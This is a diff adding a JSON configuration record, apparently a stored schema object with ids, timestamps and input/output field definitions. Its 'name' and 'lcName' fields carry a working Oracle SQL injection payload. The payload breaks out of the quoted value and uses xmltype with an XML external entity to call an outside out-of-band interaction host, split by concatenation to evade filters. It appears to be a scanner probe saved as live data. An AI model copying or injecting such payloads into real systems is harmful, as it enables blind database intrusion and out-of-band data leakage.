@@ -1,0 +1,33 @@
+{
+	"createdTime":1736635074459,
+	"deleted":false,
+	"description":"otAyeP",
+	"id":"6782f2c244ce135db1da46d4",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":854,
+	"lcName":"otayep'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"utf-8\"?><!doctype root [ <!entity % slafx system \"http://t1v1ii0mx7uj77it62bht6jn6ec705o9c1zrng.oasti'||'fy.com/\">%slafx;]>'),'/l') from dual)||'",
+	"modifiedTime":1736635074459,
+	"name":"otAyeP'||(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % slafx SYSTEM \"http://t1v1ii0mx7uj77it62bht6jn6ec705o9c1zrng.oasti'||'fy.com/\">%slafx;]>'),'/l') from dual)||'",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":854,
+	"standard":false,
+	"version":0
+}
